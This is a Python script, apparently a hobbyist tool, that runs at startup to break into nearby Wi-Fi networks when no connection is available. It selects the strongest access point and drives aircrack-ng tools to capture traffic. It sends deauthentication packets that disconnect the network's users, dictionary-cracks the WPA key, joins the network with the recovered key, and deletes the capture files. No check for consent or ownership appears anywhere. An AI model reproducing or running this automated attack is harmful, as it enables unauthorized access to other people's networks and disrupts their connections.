import subprocess
from subprocess import call
import re
import string
import numpy
from datetime import datetime
import sys
import time
import signal
import os


#Make sure aircrack is installed! This script assumes that the operative wifi adapter is enumerated on wlan0. 

#Function for testing internet connection:

def TestConnection():
    Connect = subprocess.run(["ping", "www.google.com", "-c","3"],stdout=subprocess.PIPE)
    ConnectStr = Connect.stdout.decode("UTF-8")
    Info = re.findall(r"\packets",ConnectStr)
    if(Info == []):
        return False
    else:
        return True
    
#Function to get back into normal operating for the wifi driver after runnig airmon-ng
def RestoreWifi():
    subprocess.run(["sudo", "service", "networking", "restart"])
    subprocess.run(["sudo", "airmon-ng", "start","wlan0"])
    subprocess.run(["sudo","airmon-ng","stop","wlan0mon"])
    subprocess.run(["sudo","ifconfig","wlan0","up"])
    subprocess.run(["sudo", "service", "networking", "restart"])
    subprocess.run(["sudo","dhcpcd","wlan0","start"])
    
#FUnction to start monitor mode
    
def StartMonitor():
    subprocess.run(["sudo","airmon-ng","check","kill"])

#Set up monitor on wlan0. if using multiple wifi devices, change to wlan,2,3, etc
    subprocess.run(["sudo","airmon-ng","start","wlan0"])
    
def WPAConnect(ssid, psk):
    subprocess.run(["sudo","wpa_cli","add_network"])
    time.sleep(20)
    ssid ="\'" + "\"" + ssid + "\"" + "\'"
    psk ="\'" + "\"" + psk + "\"" + "\'"
    print(ssid)
    print(psk)
    subprocess.run(["sudo", "wpa_cli", "set_network","0", "ssid",ssid])
    subprocess.run(["sudo","wpa_cli","set_network","0","psk",psk])
    subprocess.run(["sudo","wpa_cli","reconnect"])
    subprocess.run(["sudo","wpa_cli","quit"])
    subprocess.run(["sudo","dhclient","-r"])
    subprocess.run(["sudo","dhclient","wlan0"])
    subprocess.run(["sudo","wpa_cli","enable_network","0"])


    
    

#The Purpose of this script is to automatically, on startup, find an open WiFi Connection and make itself connectable.
print("BlackSix's Wifi Network Finder ver. 0.1")
#First, to attempt to ping google (if it is already connected to ANYTHING. FOr this
#reason it might be a good idea to delay the script by a minute on startup).
print("Attempting to ping...")
if(TestConnection() == True):
    print("You're good! Already connected.")
    #Do stuff to send remote destop info
    sys.exit()

#Second, to scan all available wifi APs in the area
ESSIDs = []
print("No Internet Connection. Scanning...")
while(ESSIDs == []):
    print("...")
    Networks = subprocess.run(["iwlist", "wlan0", "scan"],stdout=subprocess.PIPE)
    NetworkStr = Networks.stdout.decode("UTF-8")

#Info About Access Points:
    ESSIDs = (re.findall(r'\"(.+?)\"',NetworkStr))

print(ESSIDs)
Signalr = re.findall(r"\Signal\s\level\W\W\w\w",NetworkStr) 
Signals = []

Channelr = re.findall(r"\Channel\s\w+",NetworkStr)
Channels = []

BSSIDs = re.findall(r"\w\w\W\w\w\W\w\w\W\w\w\W\w\w\W\w\w",NetworkStr) 

print(BSSIDs)
                     
for x in Signalr:
    Signals.append(x[13:])

for y in Channelr:
    Channels.append(y[8:])
    
print(Channels)

print(Signals)

Securityr = re.findall(r"\Encryption\s\key\W\w\w", NetworkStr)

print(Securityr)

print("Strongest Wifi: " + ESSIDs[numpy.argmin(Signals)])

#Attempt to connect to access points with no encryption.
#If there is nothing immediately available, try the MAC address spoof.


#No unencrypted WIFI points available. Moving on...
print("No Unencrypted Wifi available!")

#Set up everything for aircrack...

#Kill interfering processes

StartMonitor()
#Collect Data for a little bit off the strongest Wifi connection
#If things don't work, repeat with second strongest
now = datetime.now()
Filename = now.strftime('%m-%d-%Y-%H%M')
Timing = now.strftime('%M')
print(Filename)
print(BSSIDs[numpy.argmin(Signals)])

#Reaver attack not possible. Brute FOrce...

Decoding = subprocess.Popen(["sudo timeout 300 airodump-ng --bssid " + BSSIDs[numpy.argmin(Signals)] + " --channel " + Channels[numpy.argmin(Signals)] +" --write " + Filename +" wlan0mon"],stdout=subprocess.PIPE,shell=True,preexec_fn=os.setsid)
time.sleep(30)
Terminate = subprocess.Popen(["sudo","aireplay-ng", "--deauth","10","-a",BSSIDs[numpy.argmin(Signals)], "wlan0mon"])


time.sleep(360)
#os.killpg(os.getpgid(Decoding.pid), signal.SIGTERM)
#Time2 = datetime.now()
#while(int(Time2.strftime('%M'))-int(Timing) <=2):
#    Time2 = datetime.now()
print("Done Recording")
#Terminate.terminate()
print("Now Reading File...")

PassWdData = subprocess.run(["sudo", "aircrack-ng",Filename + "-01.cap","-w","Test"],stdout=subprocess.PIPE)
PassWd = PassWdData.stdout.decode("UTF-8")
print(PassWd)
Solved = re.findall(r"\KEY\s\FOUND\W\s\[(.*?\])", PassWd)
print(Solved)
Solved = Solved[0]
Solved = Solved[1:-2]



print(Solved)
print("Restoring Wifi Driver...")
RestoreWifi()
print("WiFi Restored!")

#cleanup temp files

subprocess.run(["sudo", "rm", Filename + "-01.cap"])
subprocess.run(["sudo", "rm", Filename + "-01.csv"])
subprocess.run(["sudo", "rm", Filename + "-01.kismet.csv"])
subprocess.run(["sudo", "rm", Filename + "-01.kismet.netxml"])

#connect to Network!
WPAConnect(ESSIDs[numpy.argmin(Signals)],Solved)


#Test Connection
TestConnection()
